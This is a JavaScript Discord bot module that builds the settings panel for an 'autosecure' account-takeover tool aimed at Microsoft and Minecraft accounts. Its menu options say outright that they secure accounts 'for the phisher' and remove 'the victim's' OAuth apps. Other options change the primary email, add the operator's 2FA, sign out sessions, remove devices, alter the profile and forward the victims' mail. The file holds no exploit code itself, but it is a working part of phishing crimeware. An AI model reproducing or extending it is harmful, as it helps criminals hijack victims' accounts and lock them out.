const {
    EmbedBuilder,
    ActionRowBuilder,
    StringSelectMenuBuilder,
    ButtonBuilder,
    ButtonStyle
} = require('discord.js');
const { queryParams } = require('../../../db/database');
const config = require('../../../config.json');

module.exports = async (username) => {
    let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [username]);
    if (settings.length === 0) {
        await queryParams(`INSERT INTO secureconfig (user_id) VALUES (?)`, [username]);
        settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [username]);
    }
    settings = settings[0];

    // Resolve securing domain with sensible defaults
    const defaultDomain = (config.domains && config.domains[0]) ? config.domains[0] : 'kleomirae.fun';

    // Treat placeholder values like "ur domaine name" as NOT custom
    const rawDomain = settings.domain ? String(settings.domain).trim() : '';
    const placeholderDomains = [
        'ur domaine name',
        'your domaine name',
        'your domain name',
        'domain',
        'default'
    ];
    const isPlaceholder =
        !rawDomain ||
        placeholderDomains.includes(rawDomain.toLowerCase());

    const hasCustomDomain = !isPlaceholder;
    const securingDomain = hasCustomDomain ? rawDomain : defaultDomain;

    // If no domain was set yet, persist the default to user settings and all their bots
    if (!hasCustomDomain) {
        try {
            await queryParams(
                'UPDATE secureconfig SET domain = ? WHERE user_id = ?',
                [securingDomain, username],
                'run'
            );
            await queryParams(
                'UPDATE autosecure SET domain = ? WHERE user_id = ?',
                [securingDomain, username],
                'run'
            );
            settings.domain = securingDomain;
        } catch (err) {
            console.error('[listConfiguration] Failed to persist default securing domain:', err);
        }
    }

    function formatDobIso(dobStr) {
        if (!dobStr) return "Generated";
        const [day, month, year, region] = dobStr.split("|");
        if (!day || !month || !year) return "Generated";
        const months = [
            "January", "February", "March", "April", "May", "June",
            "July", "August", "September", "October", "November", "December"
        ];
        const monthName = months[parseInt(month, 10) - 1] || "Unknown";
        return `${parseInt(day, 10)} ${monthName}, ${year} [${region}]`;
    }

    // console.log(`info: ${JSON.stringify(settings)}`)

    const embed1 = new EmbedBuilder()
        .setTitle(`🔒 Secure Configuration`)
        .setColor(0xb2c7e0)
        .addFields(
            { name: "🔒 Autosecure", value: `${settings.auto_secure ? "✅ Enabled" : "❌ Disabled"}`, inline: true },
            { name: "🎭 Change IGN", value: `${settings.change_ign ? "✅" : "❌"}`, inline: true },
            { name: "🎮 Disable Multiplayer", value: `${settings.multiplayer ? "✅" : "❌"}`, inline: true },
            { name: "🧱 Secure non-mc", value: `${settings.secureifnomc ? "✅" : "❌"}`, inline: true },
            { name: "🚫 Bancheck", value: `${settings.checkban ? "✅" : "❌"}`, inline: true },
            { name: "📦 Autoquarantine", value: `${settings.autoquarantine ? "✅" : "❌"}`, inline: true },
            { name: "🔗 Remove oAuths", value: `${settings.oauthapps ? "✅" : "❌"}`, inline: true },
            { name: "🛡️ Remove Exploit", value: `${settings.exploit ? "✅" : "❌"}`, inline: true },
            { name: "📱 Remove Devices", value: `${settings.removedevices ? "✅" : "❌"}`, inline: true },
            { name: "📲 Add Zyger 2FA", value: `${settings.addzyger ? "✅" : "❌"}`, inline: true },
            { name: "🚪 Signout", value: `${settings.signout ? "✅" : "❌"}`, inline: true },
            { name: "🏷️ Change Gamertag", value: `${settings.changegamertag ? "✅" : "❌"}`, inline: true },
            { name: "📨 Auto-Notifier", value: `${settings.subscribemail ? "✅" : "❌"}`, inline: true },
            { name: "📧 Change Primary", value: `${settings.changeprimary === 0 ? "❌ Disabled" : settings.changeprimary === 1 ? "✅ 1 Change" : settings.changeprimary === 2 ? "✅ 2 Changes" : "❌ Disabled"}`, inline: true },
            { name: "🌐 Securing Domain", value: "```" + securingDomain + "```", inline: true },
            { name: "✉️ Security Email Prefix", value: "```" + (settings.prefix || "old") + "```", inline: true },
            { name: "🪪 Alias Prefix", value: "```" + (settings.aliasPrefix || "none") + "```", inline: true }
        );


const embed2 = new EmbedBuilder()
    .setTitle("🎨 Customization")
    .setColor(0xb2c7e0)
    .addFields(
        { name: "Change Name", value: settings.changename ? "✅" : "❌", inline: true },
        { name: "Change DOB/Region", value: settings.changedob ? "✅" : "❌", inline: true },
        { name: "Change PFP", value: settings.changepfp ? "✅" : "❌", inline: true },
        { name: "Custom Name", value: settings.name ? settings.name.replace("|", " ") : "Generated", inline: true },
        { name: "Custom DOB/Region", value: settings.dob ? formatDobIso(settings.dob) : "Generated", inline: true },
        { name: "Custom PFP", value: settings.pfp && settings.pfp !== "https://static.wikia.nocookie.net/leagueoflegends/images/e/e2/Warding_Totem_item.png/revision/latest/smart/width/250/height/250?cb=20201109132946" ? "Custom" : "Default", inline: true },
        { name: "Change Language", value: settings.changelanguage ? "✅" : "❌", inline: true },
        { name: "Custom Language", value: settings.language ? `${settings.language}` : "Default: en-US", inline: true }
    );


    const featureMenu = new StringSelectMenuBuilder()
        .setCustomId(`toggleconfig`)
        .setPlaceholder('Toggle features')
        .setMaxValues(18)
        .setMinValues(1)
.addOptions([
    { label: `${settings.auto_secure ? 'Stop' : 'Start'} Autosecure`, description: 'Automatically secure accounts for the phisher', value: `settings|auto_secure|${settings.auto_secure ? '0' : '1'}` },
    { label: `${settings.change_ign ? 'Stop' : 'Start'} Name Changer`, description: 'Adds an underscore to mc username', value: `settings|change_ign|${settings.change_ign ? '0' : '1'}` },
    { label: `${settings.multiplayer ? 'Stop' : 'Start'} Multiplayer Remover`, description: 'Disables XBOX Multiplayer in privacy settings', value: `settings|multiplayer|${settings.multiplayer ? '0' : '1'}` },
    { label: `${settings.secureifnomc ? 'Stop' : 'Start'} Securing fake accounts`, description: `Secure account if it doesn't own Minecraft`, value: `settings|secureifnomc|${settings.secureifnomc ? '0' : '1'}` },
    { label: `${settings.checkban ? 'Stop' : 'Start'} Banchecker`, description: 'Check if account is banned on Hypixel during secure', value: `settings|checkban|${settings.checkban ? '0' : '1'}` },
    { label: `${settings.autoquarantine ? 'Stop' : 'Start'} Auto-Quarantine`, description: 'Automatically add user to Hypixel Quarantine (needs proxies).', value: `settings|autoquarantine|${settings.autoquarantine ? '0' : '1'}` },
    { label: `${settings.oauthapps ? 'Stop' : 'Start'} OAuth Remover`, description: `Remove the victim's oAuths applications`, value: `settings|oauthapps|${settings.oauthapps ? '0' : '1'}` },
    { label: `${settings.exploit ? 'Stop' : 'Start'} Remove Exploit`, description: 'Removes Zyger Exploit', value: `settings|exploit|${settings.exploit ? '0' : '1'}` },
    { label: `${settings.removedevices ? 'Stop' : 'Start'} Device Remover`, description: 'Remove all devices on Microsoft.', value: `settings|removedevices|${settings.removedevices ? '0' : '1'}` },
    { label: `${settings.addzyger ? 'Stop' : 'Start'} 2FA Adder`, description: 'Adds Zyger App and Enables 2FA', value: `settings|addzyger|${settings.addzyger ? '0' : '1'}` },
    { label: `${settings.signout ? 'Stop' : 'Start'} Signout Sessions`, description: 'Sign out all active sessions on the account', value: `settings|signout|${settings.signout ? '0' : '1'}` },
    { label: `${settings.changegamertag ? 'Stop' : 'Start'} Gamertag changer`, description: 'Change XBOX Gamertag to prevent locks.', value: `settings|changegamertag|${settings.changegamertag ? '0' : '1'}` },
    { label: `${settings.subscribemail ? 'Stop' : 'Start'} Auto-notifier for security email`, description: 'DMs you all emails of secured accounts', value: `settings|subscribemail|${settings.subscribemail ? '0' : '1'}` },
    { label: `Primary Changer: ${settings.changeprimary === 0 ? 'Disabled' : settings.changeprimary === 1 ? '1 Change' : settings.changeprimary === 2 ? '2 Changes' : 'Disabled'}`, description: `Changes primary alias ${settings.changeprimary === 0 ? '(disabled)' : settings.changeprimary === 1 ? 'once' : settings.changeprimary === 2 ? 'twice' : '(disabled)'}. Cycles: 0 → 1 → 2 → 0`, value: `settings|changeprimary|${settings.changeprimary === 0 ? '1' : settings.changeprimary === 1 ? '2' : '0'}` },
    { label: `${settings.changename ? 'Stop' : 'Start'} Changing Microsoft Name`, description: 'Change Microsoft account display name', value: `settings|changename|${settings.changename ? '0' : '1'}` },
    { label: `${settings.changedob ? 'Stop' : 'Start'} Changing Microsoft DOB and Region.`, description: 'Customize date of birth and region for secured microsoft account.', value: `settings|changedob|${settings.changedob ? '0' : '1'}` },
    { label: `${settings.changepfp ? 'Stop' : 'Start'} Changing Microsoft PFP`, description: 'Change Microsoft account profile picture', value: `settings|changepfp|${settings.changepfp ? '0' : '1'}` },
    { label: `${settings.changelanguage ? 'Stop' : 'Start'} Changing Language`, description: 'Change Microsoft account language setting', value: `settings|changelanguage|${settings.changelanguage ? '0' : '1'}` }
]);

    const row = new ActionRowBuilder().addComponents(
        featureMenu
    );

    const row2 = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
            .setCustomId(`emaildomain|true`)
            .setLabel(`Change Domain`)
            .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
            .setCustomId(`emailprefix|config`)
            .setLabel(`Change Prefixes`)
            .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
            .setCustomId(`showpfp|${username}|true`)
            .setLabel(`Show PFP`)
            .setStyle(ButtonStyle.Primary)
    );

    const row3 = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId('changename|true')
            .setLabel('Change Name')
            .setStyle(ButtonStyle.Secondary),
        new ButtonBuilder()
            .setCustomId('changedob|true')
            .setLabel('Change DOB & Region')
            .setStyle(ButtonStyle.Secondary),
        new ButtonBuilder()
            .setCustomId('changepfp|true')
            .setLabel('Change PFP')
            .setStyle(ButtonStyle.Secondary),
        new ButtonBuilder()
        .setCustomId(`changelanguagesec|true`)
        .setLabel(`Change Language`)
        .setStyle(ButtonStyle.Secondary)
    );

    return {
        embeds: [embed1, embed2],
        components: [row, row2, row3],
        ephemeral: true
    };
};
